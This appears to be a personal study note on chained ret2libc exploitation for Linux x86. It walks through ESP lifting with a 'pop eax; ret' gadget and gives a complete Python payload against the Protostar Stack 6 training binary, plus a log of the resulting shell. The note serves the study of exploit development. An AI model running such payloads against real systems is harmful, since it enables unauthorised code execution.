<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Chained ret2libc</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Exploit Development - Linux - x86 - Chained ret2libc</h1></strong><br /><a href="https://www.youtube.com/watch?v=ObFiRE90wbc">https://www.youtube.com/watch?v=ObFiRE90wbc</a><br /><a href="http://phrack.org/issues/58/4.html">http://phrack.org/issues/58/4.html</a> - advanced ret2libc<br /><br />For a chained ret2libc, you need<br />• The address of the 1st libc function you want to run - e.g. <code>system()</code><br />   ◇ parameters for the 1st function - e.g. address of &quot;/bin/sh&quot; string<br />• The address of the 2nd libc function you want to run - e.g. <code>printf()</code><br />   ◇ parameters for the 2nd function - e.g. address of “done” string<br />• An ESP lifting method - like a <code>pop eax; ret</code> gadget/instruction<br /><br /><strong><h2>## About chained ret2libc</h2></strong><br />A chained ret2libc attack is effectively the same as a normal ret2libc attack, except that instead of setting the RETURN address to be exit() (or random bytes) you set the return address to the address of the next libc function you want to execute.<br /><br /><strong><h3>### The problem with chained ret2libc</h3></strong><br />The problem you encounter with chained ret2libc is that the function paremeters you put on the stack <em>for the first ret2libc function</em> will cause problems when you try to move to your 2nd ret2libc function.<br /><br />Python code example of problem:<br /><code>payload += binsh_addr</code> is what causes the problem.<br /><div class="codebox"><div class="codebox">import&nbsp;struct<br /><br />libc_system_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7e0fc00)<br />libc_exit_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7e02be0)<br />binsh_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7f4faaa)<br /><br />payload&nbsp;&nbsp;=&nbsp;&quot;A&quot;*80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;junk<br />payload&nbsp;+=&nbsp;libc_system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;overwrite&nbsp;EIP&nbsp;with&nbsp;libc&nbsp;system()<br />payload&nbsp;+=&nbsp;libc_exit_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;overwrite&nbsp;RET&nbsp;address&nbsp;with&nbsp;libc&nbsp;exit()<br />payload&nbsp;+=&nbsp;binsh_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&lt;--&nbsp;THIS&nbsp;CAUSES&nbsp;PROBLEMS&nbsp;(the&nbsp;system()&nbsp;function&nbsp;parameter)</div></div><br /><br />THERE CAN ALSO BE NO NULL BYTES WHEN USING chained ret2libc.<br />(don&#39;t know the specifics, just avoid &#39;em :shrug:)<br /><br /><strong><h3>### Solution</h3></strong><br />To solve this, you move the stack pointer (ESP) to point past the the function paramter on the stack - called ESP lifting.<br /><br /><strong>#### ESP Lifting</strong><br />• You move the stack pointer (ESP) to point past the function parameter on the stack<br />• There&#39;s a few methods of doing this<br />   ◇ A ROP gadget - use gdb-peda and the <code>ropgadget</code> tool<br />   ◇ A <code>pop eax; ret</code> instruction in libc (pop the top item off the stack into EAX, then return?)<br />      ▪ gdb-peda -&gt; <code>ropsearch “pop eax; ret” libc</code><br /><br />You use the <code>pop eax; ret</code> instruction with the functions in the chain.<br />For the last instruction, you can use the libc <code>exit()</code> function (to exit cleanly) or any 4 random bytes (which will cause a seg fault).<br /><br /><strong><h2>## Example from </h2></strong><em><strong><h2>Protostar Stack 6</h2></strong></em><br /><a href="https://exploit.education/protostar/stack-six/">https://exploit.education/protostar/stack-six/</a><br /><br />1st function - spawn shell<br />2nd function - print &quot;endusershell&quot;<br />3rd function - print &quot;kill&quot;<br /><br /><div class="codebox"><div class="codebox">#!/usr/bin/python<br />#&nbsp;exploit-education&nbsp;-&nbsp;Stack&nbsp;Six&nbsp;-&nbsp;chained&nbsp;ret2libc<br /><br />import&nbsp;struct<br /><br />bufferSize&nbsp;=&nbsp;80<br /><br />#&nbsp;LIBC<br />libc_base&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0xb7e97000<br />#&nbsp;offsets&nbsp;<br />libc_binsh_off&nbsp;&nbsp;=&nbsp;0x0011f3bf<br />libc_endusershell_off&nbsp;=&nbsp;0xd849<br />libc_kill_off&nbsp;=&nbsp;0x12697<br />#&nbsp;addresses<br />libc_system_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7ecffb0)<br />libc_exit_addr&nbsp;&nbsp;&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7ec60c0)<br />libc_printf_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0xb7eddf90)<br />libc_binsh_addr&nbsp;&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;libc_base&nbsp;+&nbsp;libc_binsh_off)<br />libc_endusershell_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;libc_base&nbsp;+&nbsp;libc_endusershell_off)<br />libc_kill_addr&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;libc_base&nbsp;+&nbsp;libc_kill_off)<br /><br />#&nbsp;INSTRUCTIONS<br />pop_eax_ret&nbsp;=&nbsp;struct.pack(&#39;&lt;I&#39;,&nbsp;0x8048487)<br /><br />#&nbsp;PAYLOAD<br />#&nbsp;1st&nbsp;Function&nbsp;-&nbsp;system(&quot;/bin/sh&quot;)<br />payload&nbsp;&nbsp;=&nbsp;&quot;A&quot;*bufferSize<br />payload&nbsp;+=&nbsp;libc_system_addr<br />payload&nbsp;+=&nbsp;pop_eax_ret<br />payload&nbsp;+=&nbsp;libc_binsh_addr<br /><br />#&nbsp;2nd&nbsp;Function&nbsp;-&nbsp;printf(&quot;endusershell&quot;)<br />payload&nbsp;+=&nbsp;libc_printf_addr<br />payload&nbsp;+=&nbsp;pop_eax_ret<br />payload&nbsp;+=&nbsp;libc_endusershell_addr<br /><br />#&nbsp;3rd&nbsp;Function&nbsp;-&nbsp;printf(&quot;kill&quot;)<br />payload&nbsp;+=&nbsp;libc_printf_addr<br />payload&nbsp;+=&nbsp;libc_exit_addr<br />payload&nbsp;+=&nbsp;libc_kill_addr<br /><br />print&nbsp;payload</div></div><br /><br />1. Spawn shell<br />2. Print “endusershell”<br />3. Print “kill”<br /><div class="codebox"><div class="codebox">$&nbsp;(python&nbsp;stack6-chained.py;&nbsp;cat)&nbsp;|&nbsp;./stack6-chained<br />input&nbsp;path&nbsp;please:&nbsp;got&nbsp;path&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA��췇�c�������IH귐����`췗��<br />id<br />uid=1001(user)&nbsp;gid=1001(user)&nbsp;groups=1001(user)<br />whoami<br />user<br />exit<br />endusershellkill</div></div><br /><br /><br /></div>
</body>
</html>
